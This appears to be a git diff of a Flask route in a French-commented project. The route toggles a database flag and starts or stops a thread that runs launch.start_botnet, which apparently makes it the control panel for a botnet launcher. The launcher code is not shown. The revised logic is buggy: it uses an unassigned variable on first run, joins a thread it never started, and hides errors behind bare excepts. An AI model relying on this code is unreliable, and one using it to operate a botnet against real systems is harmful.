@@ -25,31 +25,45 @@ def bot_launch():
         name = output['name']
 
         queue_web = Queue()
+        thread_lancement = threading.Thread(target=launch.start_botnet, args=(name, queue_web))
+
         try :
-            if name is not int :
-                return render_template('home/bot/bot.html', segment='bot', name=0)
+            try:
+                running = Running.query.filter_by(id=1).first()
+                print("recherche running")
+                state = running.running
 
-            running = Running.query.filter_by(id=1).first()
-
-            if running :
-
-                if running == 1 :
-                    queue_web.put('stop')
-                if running == 0 :
-                    thread_emission = threading.Thread(target=launch.start_botnet, args=(name, queue_web))
-                    thread_emission.start()
-            else :
+            except :
+                print("Nouveau lancement initialisation de la base de données")
                 new_running = Running(running=0)
                 db.session.add(new_running)
                 db.session.commit()
-                return render_template('home/bot/bot.html', segment='bot', name="Premier lancement -- initialisation terminé ! Veuillez relancer !")
 
-            #launch.start_botnet(name, queue_web)
-            print("lancement")
+
+            if state == 1 :
+                print("botnet deja en cours de fonctionnement")
+                queue_web.put('stop')
+                print("Eteindre botnet")
+                running.running = 0
+                db.session.commit()
+                thread_lancement.join()
+                up = False
+
+            if state == 0 :
+                print("lancement botnet")
+                thread_lancement.start()
+                running.running = 1
+                db.session.commit()
+                up = True
+
+            print("fin")
+            return render_template('home/bot/bot.html', segment='bot', name=up)
+            ##launch.start_botnet(name, queue_web)
+
         except :
             return render_template('home/bot/bot.html', segment='bot', name=0)
 
-        return render_template('home/bot/bot.html', segment='bot', name=name)
+        #return render_template('home/bot/bot.html', segment='bot', name=name)
 
 @blueprint.route('/bot/list',methods=['GET', 'POST'])
 def bot_list():
